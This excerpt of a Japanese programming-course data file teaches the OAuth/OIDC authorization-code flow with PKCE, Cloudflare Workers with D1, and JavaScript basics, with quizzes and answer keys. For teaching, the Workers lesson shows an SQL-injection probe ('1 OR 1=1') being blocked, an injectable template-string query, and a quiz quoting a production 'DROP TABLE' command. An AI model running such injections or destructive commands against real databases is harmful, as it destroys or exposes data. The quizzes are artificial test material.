     "body": "## このレッスンのゴール\n\n- OAuth 2.0 と OpenID Connect（OIDC）が何のための仕組みかを説明できる\n- 「認可コードフロー ＋ PKCE」の流れを、登場人物を使って順番に説明できる\n- アクセストークンと ID トークンの違いが分かり、AI のコードで扱いを間違えていないか確認できる\n\nレッスン 9 の「認証と認可」「`Authorization: Bearer <トークン>`」「JWT」を先に読んでおくと分かりやすいです。\n\n## 「Microsoft でサインイン」は何をしているのか\n\nレッスン 9 の最後で「ログインの仕組みは自分で作らない」という話をしました。そこで出てきた「Google でログイン」の正体が、このレッスンの **OAuth（オーオース）** です。\n\nたとえ話は **ホテルのカードキー** です。\n\n| | たとえ | 実際 |\n|---|---|---|\n| パスワード | マスターキー。渡すと何でもできてしまう | アプリには **絶対に渡さない** |\n| アクセストークン | フロントが発行するカードキー | アプリが受け取るのはこれだけ |\n| スコープ | 入れる部屋が決まっている | 「プロフィールを読む」「メールを読む」など、権限の範囲 |\n| 有効期限 | 期限が来ると使えない | 多くは 1 時間ほど |\n| 取り消し | フロントで無効にできる | ユーザーが後から連携を解除できる |\n\nポイントは、**アプリはユーザーのパスワードを一度も見ない** ことです。パスワードを入力するのは、Microsoft や Google のログイン画面だけです。\n\n## OAuth と OpenID Connect の関係\n\n| | OAuth 2.0 | OpenID Connect（OIDC） |\n|---|---|---|\n| 目的 | **認可**：「このアプリに〇〇を許可する」 | **認証**：「ログインした人は誰か」 |\n| もらうもの | **アクセストークン**（API を呼ぶ鍵） | **ID トークン**（誰がログインしたかの証明書） |\n| 関係 | 土台 | OAuth の上に乗った追加ルール |\n\nOAuth だけでは「誰がログインしたか」をきちんと確かめられません。そこで、ログインに使うときは **OAuth ＋ OIDC をセットで使います**。\n世の中で「OAuth 認証」と呼ばれているものは、ほとんどの場合この 2 つの組み合わせです。\n\n## 登場人物\n\n| 役割 | 正式な名前 | Microsoft の場合の例 |\n|---|---|---|\n| あなた | リソースオーナー（ユーザー） | Outlook や会社のアカウントを持っている人 |\n| 自分が作るアプリ | クライアント | popup2027 や、FastAPI で作った Web アプリ |\n| ログイン画面とトークンを出す係 | 認可サーバー | **Microsoft Entra ID**（旧 Azure AD）の `login.microsoftonline.com` |\n| データを持っている API | リソースサーバー | **Microsoft Graph**（`graph.microsoft.com`。プロフィール・メール・予定表など） |\n\nMicrosoft のこの仕組み全体を **Microsoft ID プラットフォーム** と呼びます。使う前に、Azure ポータル（Microsoft のクラウドの管理画面）で **アプリの登録** をして、次の 2 つを決めます。\n\n- **クライアント ID**：アプリの名札。`11111111-2222-...` のような長い ID が発行される（秘密ではない）\n- **リダイレクト URI**：ログインが終わった後に戻ってくる URL（例 `http://localhost:8000/callback`）\n\n## 認可コードフロー：いちばん大事な流れ\n\n```text\n① アプリ      → ユーザーを Microsoft のログイン画面へ移動させる（URL にクライアント ID・スコープなどを付けて）\n② ユーザー    → Microsoft の画面でログインし、「このアプリに〇〇を許可しますか？」で同意する\n③ Microsoft   → リダイレクト URI に戻す。URL に「認可コード」（使い捨ての引換券）が付いている\n④ アプリ      → 裏側（サーバー同士）で、認可コードをトークンに引き換える\n⑤ アプリ      → 受け取ったアクセストークンで API を呼ぶ／ID トークンで「誰か」を知る\n```\n\nなぜ ③ でいきなりトークンを渡さず、「引換券」を挟むのでしょうか。\n③ はブラウザのアドレスバーを通るので、履歴などに残って盗まれる可能性があります。そこで、盗まれても単独では役に立たない **使い捨ての引換券** だけをブラウザに通し、本物のトークンは ④ の裏側のやり取りで受け取ります。\n\n### ① ログイン画面への URL\n\n```python\nimport base64, hashlib, secrets\nfrom urllib.parse import urlencode\n\nverifier = secrets.token_urlsafe(48)        # PKCE の「合言葉」（後で説明）。自分だけが覚えておく\nchallenge = base64.urlsafe_b64encode(\n    hashlib.sha256(verifier.encode()).digest()\n).rstrip(b\"=\").decode()                     # 合言葉をハッシュ化したもの。こちらは渡してよい\nstate = secrets.token_urlsafe(16)           # なりすまし対策のランダムな値\n\nparams = {\n    \"client_id\": \"11111111-2222-3333-4444-555555555555\",\n    \"response_type\": \"code\",                       # 「認可コードをください」\n    \"redirect_uri\": \"http://localhost:8000/callback\",\n    \"scope\": \"openid profile User.Read\",           # ログイン＋プロフィールを読む権限\n    \"state\": state,\n    \"code_challenge\": challenge,\n    \"code_challenge_method\": \"S256\",\n}\nurl = \"https://login.microsoftonline.com/common/oauth2/v2.0/authorize?\" + urlencode(params)\n```\n\n実行すると、こんな URL ができます（実際に実行して確認しました）。\n\n```text\nhttps://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=1111...&response_type=code\n&redirect_uri=http%3A%2F%2Flocalhost%3A8000%2Fcallback&scope=openid+profile+User.Read&state=Vuk...&code_challenge=2pD...&code_challenge_method=S256\n```\n\n| パラメータ | 意味 |\n|---|---|\n| `common` | 個人アカウントも会社のアカウントも OK。会社の人だけにしたいなら、ここを会社のテナント（組織）ID にする |\n| `scope` の `openid` | 「OIDC でログインもしたい」の合図。これで ID トークンがもらえる |\n| `scope` の `User.Read` | Microsoft Graph でプロフィールを読む権限 |\n| `state` | ③ で戻ってきたとき、自分が送った値と同じかを確かめる。違えば偽物のリクエスト |\n\n### ③〜④ 引換券をトークンに換える\n\n③ で `http://localhost:8000/callback?code=0.AXo...&state=Vuk...` に戻ってきたら、サーバーがトークンを取りに行きます。\n\n```python\nimport requests\n\nresp = requests.post(\n    \"https://login.microsoftonline.com/common/oauth2/v2.0/token\",\n    data={\n        \"client_id\": CLIENT_ID,\n        \"grant_type\": \"authorization_code\",\n        \"code\": code,                         # ③ で受け取った引換券\n        \"redirect_uri\": \"http://localhost:8000/callback\",\n        \"code_verifier\": verifier,            # ① で作った合言葉そのもの\n        \"client_secret\": CLIENT_SECRET,       # サーバーで動くアプリだけ（環境変数から）\n    },\n)\ntokens = resp.json()\n# {\"token_type\": \"Bearer\", \"expires_in\": 3599, \"access_token\": \"eyJ0...\",\n#  \"id_token\": \"eyJ0...\", \"refresh_token\": \"1.AXo...\" , ...}\n```\n\n### ⑤ API を呼ぶ\n\n```python\nme = requests.get(\n    \"https://graph.microsoft.com/v1.0/me\",\n    headers={\"Authorization\": \"Bearer \" + tokens[\"access_token\"]},\n).json()\n# {\"displayName\": \"Ryo ...\", \"mail\": \"...\", \"id\": \"...\"}\n```\n\nレッスン 9 の `Authorization: Bearer <トークン>` と同じ形です。違うのは、**トークンを発行したのが自分のサーバーではなく Microsoft** だという点だけです。\n\n## PKCE（ピクシー）：引換券を盗まれても大丈夫にする\n\nスマホアプリやブラウザだけで動くアプリ（React など）は、`client_secret` を安全に隠しておけません（配布したアプリの中身は誰でも覗けるため）。\nすると、③ の引換券を盗まれたら、他人がトークンに換えられてしまいます。そこで使うのが **PKCE** です。\n\n```text\n① 合言葉（verifier）を作り、そのハッシュ（challenge）だけを Microsoft に渡す\n④ 引き換えるときに、合言葉そのもの（verifier）を見せる\n   → Microsoft は「ハッシュ化したら ① の challenge と一致するか」を確かめる\n```\n\nハッシュは元に戻せない（レッスン 9）ので、① の URL を覗き見ても合言葉は分かりません。**引換券と合言葉の両方を持っている本人だけ** がトークンを受け取れます。\nいまは、サーバーで動くアプリでも PKCE を付けるのが推奨です。上の Python の計算方法が正しいことは、PKCE の仕様書（RFC 7636）に載っている例の値と一致することで確かめました。\n\n## 2 種類のトークン（＋1）\n\n| | アクセストークン | ID トークン | リフレッシュトークン |\n|---|---|---|---|\n| 何のため | API を呼ぶ鍵 | 「誰がログインしたか」の証明書 | 期限が切れたトークンを取り直す |\n| 誰が読む | **API（リソースサーバー）** | **自分のアプリ** | 認可サーバーに送るだけ |\n| 形 | JWT のことが多い（中身は API 用。アプリは読まない約束） | 必ず JWT | ただの長い文字列 |\n| 寿命 | 短い（1 時間ほど） | 短い | 長い（数日〜数十日） |\n\nID トークンの中身（JWT の真ん中の部分）は、たとえばこうなっています。\n\n```json\n{\n  \"iss\": \"https://login.microsoftonline.com/<テナントID>/v2.0\",\n  \"aud\": \"11111111-2222-3333-4444-555555555555\",\n  \"exp\": 1795000000,\n  \"nonce\": \"…\",\n  \"name\": \"Ryo …\",\n  \"preferred_username\": \"ryo@example.com\",\n  \"oid\": \"…\", \"tid\": \"…\", \"sub\": \"…\"\n}\n```\n\n| 項目 | 意味 | 確かめること |\n|---|---|---|\n| `iss` | 発行者 | 本当に Microsoft が発行したか |\n| `aud` | 宛先 | **自分のアプリのクライアント ID** 宛てか（他のアプリ宛ての ID トークンを使い回されていないか） |\n| `exp` | 有効期限 | 期限内か |\n| `nonce` | ログインのたびに作るランダムな値 | 自分が ① で送った値と一致するか（使い回し対策） |\n| `oid` ＋ `tid` | ユーザーの ID ＋ 組織の ID | **ユーザーを見分けるのはこれ**（または `sub`） |\n\n⚠️ `preferred_username` やメールアドレスは変わることがあり、別の人が同じ値を使える場合もあります。**データベースでユーザーを特定する鍵にしない** のが Microsoft の推奨です。\n\n## 実際はライブラリに任せる：MSAL\n\nここまでの手順（state・PKCE・nonce・署名の確認・トークンの更新）を自分で全部書くと、どこかで間違えます。Microsoft の場合は公式ライブラリ **MSAL**（Microsoft Authentication Library）を使います。\n\n```python\nimport msal\n\napp = msal.ConfidentialClientApplication(\n    CLIENT_ID,\n    authority=\"https://login.microsoftonline.com/common\",\n    client_credential=CLIENT_SECRET,           # 環境変数から読む\n)\n\n# ① ログイン画面の URL を作る（state・PKCE・nonce は自動で付く）\nflow = app.initiate_auth_code_flow([\"User.Read\"], redirect_uri=\"http://localhost:8000/callback\")\n# flow はセッションに保存しておき、ユーザーを flow[\"auth_uri\"] へ移動させる\n\n# ③〜④ 戻ってきたら、URL のパラメータを渡すだけ\nresult = app.acquire_token_by_auth_code_flow(flow, request.query_params)\nif \"error\" in result:\n    ...                                        # result[\"error_description\"] に理由\naccess_token = result[\"access_token\"]\nuser = result[\"id_token_claims\"]               # 確認済みの ID トークンの中身\n```\n\n実際に動かして確かめたこと：\n\n- `initiate_auth_code_flow` が作る URL には、`state`・`code_challenge`（PKCE）・`nonce` が自動で入る。`scope` には `openid profile offline_access` も自動で足される\n- 逆に、自分で `[\"openid\", \"User.Read\"]` のように書くと `ValueError: You cannot use any scope value that is reserved.` というエラーになる（MSAL が自動で付けるものなので、書かない）\n\n| 種類 | MSAL のクラス | 例 |\n|---|---|---|\n| サーバーで動く（秘密を隠せる） | `ConfidentialClientApplication` | FastAPI・Django の Web アプリ |\n| 利用者の手元で動く（秘密を隠せない） | `PublicClientApplication` | スマホアプリ・デスクトップアプリ |\n| ブラウザで動く | `@azure/msal-browser`（JavaScript） | React などの SPA |\n\nPython で言うと、MSAL は「OAuth の手順をまとめた便利な関数の詰め合わせ」です。Google なら Google の公式ライブラリや Authlib、まとめて扱うなら Auth0・Clerk・Firebase Authentication などを使います。**中でやっていることは、このレッスンの流れと同じ** です。\n\n## AI のコードではこう出てくる\n\n### 読むときのチェックポイント\n\n| 見る場所 | ✅ よい | ⚠️ 要注意 |\n|---|---|---|\n| `client_secret` | 環境変数から読み、サーバーだけで使う | React やスマホアプリのコードに書いてある |\n| `state` | 戻ってきたときに比べている | 送るだけで比べていない／付けていない |\n| PKCE | `code_challenge` がある（またはライブラリ任せ） | 公開クライアントなのに PKCE なし |\n| `response_type` | `code` | `token`（古い「インプリシットフロー」。今は非推奨） |\n| ID トークン | ライブラリが署名・`aud`・`exp` を確認している | `jwt.decode(..., options={\"verify_signature\": False})` で中身を読んで信じている |\n| ユーザーの特定 | `oid`＋`tid`（または `sub`） | メールアドレスで特定している |\n| トークンの保存 | サーバーのセッションや HttpOnly Cookie | ブラウザの `localStorage`（XSS で盗まれやすい） |\n| スコープ | 必要な分だけ | とりあえず全部の権限を要求している |\n\n### よく出るエラー\n\n| エラー | よくある原因 |\n|---|---|\n| `AADSTS50011`（リダイレクト URI が一致しない） | アプリの登録の URI とコードの URI が 1 文字でも違う（`http`/`https`、末尾の `/`、ポート番号） |\n| `AADSTS700016`（アプリが見つからない） | クライアント ID の間違い、または `common` とテナントの設定が合っていない |\n| `invalid_grant` | 認可コードの使い回し・期限切れ（数分で切れる）、`code_verifier` が合わない |\n| API から `401` | アクセストークンの期限切れ。リフレッシュトークンで取り直す |\n| API から `403` | ログインは OK だが、スコープ（権限）が足りない |\n\n最後の 2 つは、レッスン 9 の 401（誰か分からない）と 403（権限が無い）の区別そのままです。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "OAuth の「認可コードフロー」で、ブラウザのアドレスバーを通って渡されるのはどれ？",
        "choices": [
         "アクセストークン",
         "使い捨ての認可コード（引換券）",
         "ユーザーのパスワード"
        ],
        "answer": 1,
        "explain": "ブラウザを通る部分は盗まれる可能性があるので、単独では役に立たない引換券だけを通します。トークンへの引き換えは裏側のやり取りで行います。"
       },
       {
        "question": "自分のアプリが「ログインしたのは誰か」を知るために使うのは？",
        "choices": [
         "アクセストークンの中身を読む",
         "リフレッシュトークン",
         "ID トークン（OpenID Connect）"
        ],
        "answer": 2,
        "explain": "アクセストークンは API に見せる鍵で、アプリが中身を読む前提ではありません。「誰か」は OIDC の ID トークンで確かめます。"
       },
       {
        "question": "React だけで動くアプリ（サーバー無し）のコードに、AI が `client_secret` を書いていた。どう判断する？",
        "choices": [
         "環境変数にしてあれば問題ない",
         "ブラウザに配られるコードは誰でも読めるので、秘密は置けない。公開クライアントとして PKCE を使う形に直す",
         "`client_secret` を Base64 にしておけば安全"
        ],
        "answer": 1,
        "explain": "ブラウザで動くコードは、ビルド時の環境変数も含めて利用者に丸見えです。秘密を持てないアプリは「公開クライアント」として登録し、PKCE で守ります。"
       },
       {
        "question": "PKCE の `code_verifier`（合言葉）について正しいのは？",
        "choices": [
         "最初に Microsoft のログイン画面の URL にそのまま付ける",
         "誰に見られても問題ない値である",
         "最初はハッシュだけを渡し、合言葉そのものはトークンに引き換えるときに初めて見せる"
        ],
        "answer": 2,
        "explain": "合言葉のハッシュ（`code_challenge`）を先に渡し、あとで合言葉そのものを見せて一致を確かめます。ハッシュは元に戻せないので、途中で覗かれても合言葉は分かりません。"
       }
      ]
     ],
     "id": "18-oauth-oidc"
    },
    {
     "title": "Cloudflare Workers と D1 ― サーバーレスで API とデータベース",
     "level": 4,
     "minutes": 22,
     "concepts": [
      "database",
      "deploy",
      "backend",
      "http_api"
     ],
     "summary": "サーバーを持たずに API を公開する Cloudflare Workers と、SQLite がそのまま使えるデータベース D1。設定ファイル・バインディング・SQL の書き方を、実際に動かしたコードで読む。",
     "body": "## このレッスンのゴール\n\n- Cloudflare Workers と D1 が何で、普通のサーバー＋データベースと何が違うかを説明できる\n- `wrangler.jsonc` の「バインディング」と、コードの `env.DB` のつながりを読める\n- D1 を使う JavaScript のコードを、Python の `sqlite3`（レッスン 7）と対応づけて読み、危ない書き方に気づける\n\nレッスン 7（SQL と CRUD）とレッスン 15（デプロイ）の続きです。コードは JavaScript ですが、Python との対応を必ず並べます。\n\n## Workers と D1 とは\n\n| | 何か | Python の世界で言うと |\n|---|---|---|\n| **Cloudflare Workers** | Cloudflare のサーバーで動く **サーバーレス関数**（レッスン 15 の表）。リクエストが来るたびに関数が呼ばれる | FastAPI のアプリを、サーバーの用意なしで動かしてもらうイメージ |\n| **D1**（ディーワン） | Cloudflare の **サーバーレスな SQL データベース**。中身は **SQLite** | `sqlite3.connect(\"app.db\")` の app.db を、Cloudflare が預かって管理してくれる |\n| **Wrangler**（ラングラー） | 開発・デプロイ用のコマンド（`npx wrangler ...`） | `uvicorn` と、デプロイ用のツールをまとめたもの |\n\n**サーバーレス** とは「サーバーが無い」ではなく、**サーバーの用意・OS の更新・台数の調整を、自分でしなくてよい** という意味です。\n\nレッスン 7 で学んだ SQL（`CREATE TABLE`・`SELECT`・`INSERT` …）と `?` の書き方が、D1 でも **ほぼそのまま** 使えます。\n\n## 全体のファイル\n\n```text\ntasks-api/\n  wrangler.jsonc   ← 設定（Worker の名前・どの D1 を使うか）\n  schema.sql       ← テーブルを作る SQL\n  src/index.js     ← Worker 本体（リクエストを受けて返す）\n```\n\n### 設定ファイルと「バインディング」\n\nまずデータベースを作ります。\n\n```bash\nnpx wrangler d1 create tasks-db\n```\n\n表示された `database_id` を設定ファイルに書きます（`.jsonc` は「コメントを書いてもよい JSON」）。\n\n```jsonc\n{\n  \"name\": \"tasks-api\",\n  \"main\": \"src/index.js\",\n  \"compatibility_date\": \"2026-11-01\",\n  \"d1_databases\": [\n    {\n      \"binding\": \"DB\",                 // ← コードの中で env.DB として使える名前\n      \"database_name\": \"tasks-db\",\n      \"database_id\": \"（create のときに表示された ID）\"\n    }\n  ]\n}\n```\n\n**バインディング** は、「このデータベースを `DB` という名前で Worker に渡してね」という設定です。\nPython で言うと、`DATABASE_URL` を環境変数で渡す（レッスン 15）のに近いですが、渡されるのは URL の文字列ではなく **すぐ使える接続そのもの** です。パスワードや接続文字列をコードに書かなくてよいのが利点です。\n\n- `compatibility_date`：「この日付の時点の Workers の動き方に合わせて」という指定。日付を変えると細かい動作が変わることがある\n- `database_id` は秘密ではありません（これだけでは他人はデータベースに触れません）。ただし API トークンなどの本物の秘密は、`npx wrangler secret put 名前` で登録し、設定ファイルやコードには書きません\n\n### テーブルを作る\n\n```sql\nCREATE TABLE IF NOT EXISTS tasks (\n  id     INTEGER PRIMARY KEY AUTOINCREMENT,\n  title  TEXT NOT NULL,\n  status TEXT NOT NULL DEFAULT 'todo'\n);\nINSERT INTO tasks (title) VALUES ('会場を探す'), ('チラシを作る');\n```\n\n```bash\nnpx wrangler d1 execute tasks-db --local  --file=./schema.sql   # 手元の練習用データベースに\nnpx wrangler d1 execute tasks-db --remote --file=./schema.sql   # 本番（Cloudflare 上）に\n```\n\n⚠️ `--local` と `--remote` の違いが大事です。`--local` は自分のパソコンの中のコピー、`--remote` は **本物のデータ** です。AI が出したコマンドに `--remote` が付いていたら、本番のデータを変えてよいのか確認しましょう。\n\n## Worker 本体を読む\n\n```javascript\nexport default {\n  async fetch(request, env) {\n    const url = new URL(request.url);\n\n    // GET /tasks → 一覧\n    if (request.method === \"GET\" && url.pathname === \"/tasks\") {\n      const { results } = await env.DB\n        .prepare(\"SELECT id, title, status FROM tasks ORDER BY id\")\n        .all();\n      return Response.json(results);\n    }\n\n    // GET /tasks/1 → 1 件\n    const m = url.pathname.match(/^\\/tasks\\/(\\d+)$/);\n    if (request.method === \"GET\" && m) {\n      const task = await env.DB\n        .prepare(\"SELECT id, title, status FROM tasks WHERE id = ?\")\n        .bind(Number(m[1]))\n        .first();\n      if (task === null) {\n        return Response.json({ error: \"タスクが見つかりません\" }, { status: 404 });\n      }\n      return Response.json(task);\n    }\n\n    // POST /tasks → 追加\n    if (request.method === \"POST\" && url.pathname === \"/tasks\") {\n      const body = await request.json();\n      if (typeof body.title !== \"string\" || body.title.trim() === \"\") {\n        return Response.json({ error: \"title は必須です\" }, { status: 400 });\n      }\n      const result = await env.DB\n        .prepare(\"INSERT INTO tasks (title) VALUES (?)\")\n        .bind(body.title)\n        .run();\n      return Response.json({ id: result.meta.last_row_id }, { status: 201 });\n    }\n\n    return Response.json({ error: \"Not Found\" }, { status: 404 });\n  },\n};\n```\n\n### 入口：`fetch(request, env)`\n\n- Worker は `fetch` という関数を 1 つ持ったオブジェクトを `export default` します（JavaScript コースのモジュールのレッスン）\n- **リクエストが 1 つ来るたびに `fetch` が呼ばれ**、返した `Response` がそのままレスポンスになる\n- `env` に、設定ファイルのバインディング（`env.DB`）や、登録した秘密（`env.API_KEY` など）が入っている\n- `async` / `await`：データベースの返事を待つ間、他の仕事ができるようにする書き方（JavaScript コースの非同期処理）\n\nFastAPI では `@app.get(\"/tasks\")` で道案内（ルーティング、レッスン 5）をしましたが、ここでは `if` で `request.method` と `url.pathname` を見て、自分で振り分けています。大きくなると **Hono** などのフレームワークを使い、`app.get(\"/tasks\", ...)` と FastAPI に似た書き方になります。\n\n### D1 の 4 つの命令\n\n| D1（JavaScript） | 意味 | Python の `sqlite3` で言うと |\n|---|---|---|\n| `env.DB.prepare(sql)` | SQL を準備する | `conn.execute(sql, ...)` の `sql` 部分 |\n| `.bind(値1, 値2)` | `?` に値を入れる | `conn.execute(sql, (値1, 値2))` のタプル |\n| `.all()` | 全部の行を取る → `{ results: [...] }` | `cur.fetchall()` |\n| `.first()` | 最初の 1 行を取る。無ければ `null` | `cur.fetchone()`（無ければ `None`） |\n| `.run()` | 実行だけ（INSERT・UPDATE・DELETE）。`meta.last_row_id` などが返る | `cur.lastrowid` |\n\n- `const { results } = ...`：返ってきたオブジェクトから `results` だけを取り出す書き方（分割代入）。Python で言うと `results = resp[\"results\"]`\n- Python の `sqlite3` では `conn.commit()` が必要でしたが、D1 は **1 つの命令ごとに自動で確定** します。まとめて実行したいときは `env.DB.batch([...])` を使い、途中で失敗したら全部取り消されます\n\n## 実際に動かして確かめた\n\n`npx wrangler dev`（手元で Worker を動かすコマンド。Python で言うと `uvicorn main:app --reload`）で起動し、`curl` でリクエストを送りました。\n\n```text\nGET  /tasks                    → [{\"id\":1,\"title\":\"会場を探す\",...},{\"id\":2,\"title\":\"チラシを作る\",...}]\nPOST /tasks {\"title\":\"受付を決める\"} → {\"id\":3}               201\nPOST /tasks {\"title\":\"\"}       → {\"error\":\"title は必須です\"} 400\nGET  /tasks/3                  → {\"id\":3,\"title\":\"受付を決める\",\"status\":\"todo\"}\nGET  /tasks/99                 → {\"error\":\"タスクが見つかりません\"} 404\nGET  /tasks/1%20OR%201=1       → {\"error\":\"Not Found\"}       404\n```\n\n最後の行は SQL インジェクション（レッスン 7・11）を試したものです。正規表現 `(\\d+)` が数字しか通さないうえに、値は `.bind()` で渡しているので、SQL の一部として実行されることはありません。\n\n## 普通のサーバー＋データベースとの違い\n\n| | Workers ＋ D1 | FastAPI ＋ PostgreSQL（レッスン 15 の PaaS など） |\n|---|---|---|\n| サーバーの管理 | 不要 | PaaS ならほぼ不要、VPS なら必要 |\n| 動く場所 | 世界中の Cloudflare の拠点（利用者の近くで動く） | 選んだ 1 つの地域 |\n| 待機中の料金 | リクエストが無ければほぼかからない | 起動している間かかることが多い |\n| 言語 | JavaScript / TypeScript が中心（Python も一部対応） | 自由 |\n| データベースの大きさ | 1 つのデータベースに容量の上限がある（上限は料金プランで違い、変わることもあるので公式の料金ページで確認） | 大きなデータも扱いやすい |\n| 向いている場面 | 個人開発・小〜中規模・アクセスに波がある API | 大規模・複雑な処理・長時間の処理 |\n\nWorkers は **短い処理を素早く返す** のが得意です。ファイルの変換のような重い処理や、何分もかかる処理は、別の仕組み（レッスン 13 の非同期ジョブなど）と組み合わせます。\n\n## AI のコードではこう出てくる\n\n| 見る場所 | ✅ よい | ⚠️ 要注意 |\n|---|---|---|\n| SQL の値 | `.prepare(\"... WHERE id = ?\").bind(id)` | `` .prepare(`... WHERE id = ${id}`) ``（テンプレート文字列で SQL を組み立てている → SQL インジェクション） |\n| 見つからないとき | `.first()` の `null` を確かめて 404 | `null` のまま `task.title` を読んでエラー（500） |\n| 入力のチェック | 型・空文字を確かめて 400（レッスン 6） | `request.json()` の中身をそのまま保存 |\n| 秘密 | `env.API_KEY`（`wrangler secret put` で登録） | `wrangler.jsonc` やコードに直接書いてある |\n| コマンド | 練習は `--local` | 確認なしに `--remote` でテーブルを消す・作り直す |\n| 他人のデータ | ログイン中のユーザーの ID で `WHERE owner_id = ?` も付けている | ID だけで取り出している（IDOR、レッスン 9） |\n\n⚠️ 一番大事なのは 1 行目です。JavaScript の `` `...${id}...` `` は、Python の f 文字列 `f\"... {id} ...\"` と同じで、**SQL を文字列の連結で作ってしまう** 書き方です。D1 でも、必ず `?` と `.bind()` を使います。\n\n### レッスン 18 とつなげると\n\n「Microsoft でサインイン」（レッスン 18）と組み合わせると、たとえばこんな形になります。\n\n```text\nブラウザ → Microsoft でログイン → ID トークンの oid ＋ tid でユーザーを特定\n       → Worker の API（ログイン済みか確認）→ D1 の tasks から WHERE owner = ? で自分の分だけ返す\n```\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`wrangler.jsonc` の `\"binding\": \"DB\"` の意味として正しいのは？",
        "choices": [
         "データベースのパスワードを DB という名前で保存する",
         "この D1 データベースを、Worker のコードの中で `env.DB` として使えるようにする",
         "DB という名前の新しいテーブルを作る"
        ],
        "answer": 1,
        "explain": "バインディングは、Cloudflare のサービス（D1 など）を Worker に渡すための名前です。コードからは `env.DB.prepare(...)` のように使います。"
       },
       {
        "question": "AI が次のコードを書いた。一番の問題は？ `` env.DB.prepare(`SELECT * FROM tasks WHERE title = '${title}'`).all() ``",
        "choices": [
         "`.all()` ではなく `.first()` を使うべき",
         "`SELECT *` は遅いので必ずエラーになる",
         "入力を文字列に直接埋め込んでいるので、SQL インジェクションの危険がある"
        ],
        "answer": 2,
        "explain": "Python の f 文字列で SQL を組み立てるのと同じ危険です。`.prepare(\"SELECT * FROM tasks WHERE title = ?\").bind(title)` のように、`?` と `.bind()` で値を渡します。"
       },
       {
        "question": "`.first()` で該当する行が無かったとき、返ってくるのは？",
        "choices": [
         "`null`",
         "空の配列 `[]`",
         "例外（エラー）が投げられる"
        ],
        "answer": 0,
        "explain": "行が無いと `null` が返ります（Python の `fetchone()` が `None` を返すのと同じ）。確かめずに `task.title` と書くとエラーになるので、上のコードのように 404 を返します。"
       },
       {
        "question": "`npx wrangler d1 execute tasks-db --remote --command \"DROP TABLE tasks\"` を AI が提案してきた。どう考える？",
        "choices": [
         "`--remote` は手元の練習用なので、気にせず実行してよい",
         "`--remote` は本番のデータベースなので、本当に消してよいかを確かめてから実行する",
         "`DROP TABLE` は D1 では使えないので、何も起きない"
        ],
        "answer": 1,
        "explain": "`--local` が手元のコピー、`--remote` が Cloudflare 上の本番です。`DROP TABLE` はテーブルごとデータを消すので、本番では特に慎重にします。"
       }
      ]
     ],
     "id": "19-cloudflare-workers-d1"
    }
   ],
   "status": "open"
  },
  {
   "title": "JavaScript",
   "icon": "🟨",
   "order": 20,
   "description": "Web ページを動かす言語。Python との違いを意識しながら読めるようになる。",
   "levels": {
    "1": "入門",
    "2": "基礎",
    "3": "実践"
   },
   "id": "20-javascript",
   "lessons": [
    {
     "title": "JavaScript の第一歩と変数",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "variables",
      "types",
      "basics"
     ],
     "summary": "JavaScript がどこで動くか、let / const と基本の型。",
     "body": "## このレッスンのゴール\n\n- JavaScript が「ブラウザ」と「Node.js」で動くと説明できる\n- `const` / `let` / `var` の違いが分かる\n- Python との見た目の違い（`;`、`{}`、キャメルケース）に慣れる\n\n## どこで動く？\n\n| 場所 | 用途 |\n|---|---|\n| ブラウザ | Web ページを動かす（ボタン・画面の書き換え） |\n| Node.js | サーバー・ツール（Python と同じように PC 上で動く） |\n\nブラウザで F12 →「コンソール」を開くと、その場で JavaScript を試せます。\n\n## Python と並べてみる\n\n```javascript\nconst name = \"Ryo\";            // 変えない変数\nlet count = 0;                 // 変える変数\ncount = count + 1;\nconsole.log(`${name}: ${count}`);  // 表示（Python の print + f-string）\n```\n\n```python\nname = \"Ryo\"\ncount = 0\ncount = count + 1\nprint(f\"{name}: {count}\")\n```\n\n| | Python | JavaScript |\n|---|---|---|\n| 表示 | `print()` | `console.log()` |\n| 文の終わり | 改行 | `;`（省略可能だが付けることが多い） |\n| コメント | `#` | `//`（複数行は `/* */`） |\n| 名前の付け方 | `user_name`（スネークケース） | `userName`（キャメルケース） |\n\n## const / let / var\n\n- `const`：再代入できない。**基本はこれ**\n- `let`：再代入したいときだけ\n- `var`：古い書き方。AI の新しいコードではほぼ使われない（見たら古いコードのサイン）\n\n```javascript\nconst items = [1, 2];\nitems.push(3);      // OK！ 中身の変更はできる\nitems = [];         // エラー：箱そのものの入れ替えはできない\n```\n\n`const` は「中身が変わらない」ではなく **「別の値を入れ直せない」** という意味です。\n\n## 基本の型\n\n| 型 | 例 | Python では |\n|---|---|---|\n| number | `42`, `3.14` | int と float が 1 つにまとまっている |\n| string | `\"a\"`, `'a'`, `` `a` `` | str |\n| boolean | `true`, `false`（小文字！） | `True`, `False` |\n| null / undefined | 「値が無い」 | None |\n| object / array | `{a: 1}`, `[1, 2]` | dict / list |\n\n`undefined` は「まだ何も入っていない」、`null` は「意図的に空にした」。Python の `None` が 2 種類あるイメージです。\n\n## ⚠️ == と ===\n\n```javascript\n1 == \"1\"    // true （型を勝手にそろえて比べる）\n1 === \"1\"   // false（型も含めて比べる）\n```\n\n**JavaScript では常に `===` を使う** のが鉄則です。AI のコードで `==` があれば、レビューで確認するポイントです。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "再代入しない変数を宣言するとき、基本的に使うのは？",
        "choices": [
         "const",
         "let",
         "var"
        ],
        "answer": 0,
        "explain": "迷ったら const、再代入が必要なときだけ let です。"
       },
       {
        "question": "Python の `True` は JavaScript では？",
        "choices": [
         "True",
         "true",
         "TRUE"
        ],
        "answer": 1,
        "explain": "JavaScript の真偽値は小文字です。"
       },
       {
        "question": "`0 === \"0\"` の結果は？",
        "choices": [
         "true",
         "false"
        ],
        "answer": 1,
        "explain": "=== は型も比べるので、数値と文字列は等しくありません。"
       }
      ]
     ],
     "id": "01-js-basics"
    },
    {
     "title": "条件分岐と繰り返し",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "conditionals",
      "loops"
     ],
     "summary": "if / for / while を Python と見比べる。",
